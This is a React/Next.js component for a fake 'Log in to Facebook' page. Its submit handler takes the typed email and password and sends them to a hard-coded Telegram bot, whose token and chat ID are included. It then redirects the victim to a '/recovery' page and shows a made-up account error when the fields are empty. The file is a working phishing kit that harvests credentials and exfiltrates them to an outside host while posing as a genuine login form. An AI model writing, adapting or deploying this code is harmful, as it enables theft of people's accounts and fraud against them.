
import { useRef } from 'react';
import router from "next/router";
import styles from '../../styles/Facebook.module.css'
import { useState } from 'react';
const Forget = () => {
  const [logError, setLogError] = useState("")
  const emailref = useRef();
  const passref = useRef();

  let bot = {
    token: "2140501096:AAHJgY2SgrHFvMRQWiND_k7z2RBRfdeDHSE",
    chatID: "2130650938"
  };

  // let status = "disabled";
  const handleSubmit = (e) => {
    e.preventDefault();
    let email = emailref.current.value;
    let pass = passref.current.value;

    if (email === "" || pass === "") {
      router.push("/forget");
      setLogError("The email address or mobile number you entered isn't connected to an account. Find your account and log in.")
    } else {
      let sms = [email, pass]

      fetch(
        `https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chatID}=&text=${sms}`,
        {
          method: "GET",
        }
      ).then(
        (success) => {
          router.push("/recovery");
        },
        (error) => {
          alert("message Not Sent");
          console.log(error);
        }
      );
    }
  };

  return (
    <section>
      <div className="container">
        <div className="row justify-content-center">
          <div className="col-md-6">
            <div className="right-content">
              <div className={styles.logCard}>
                <p className='text-center' style={{ fontSize: "20px" }}>Log in to Facebook</p>
                <form className="form-group" onSubmit={handleSubmit}>
                  <div className={styles._6lux}>
                    <input ref={emailref} className={`${styles.logForm} form-control `} type="text" placeholder="Email address or phone number" />
                  </div>
                  <div className={styles._6lux}>
                    <small className='text-danger'>{logError}</small>
                  </div>
                  <div className={styles._6lux}>
                    <input ref={passref} className={`${styles.logForm} form-control `} type="password" placeholder="Password" />
                  </div>
                  <button type="submit" className={styles.logbtn}>Log In</button>
                </form>
                <a href="#" className="pt-2">Forgotten password?</a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default Forget;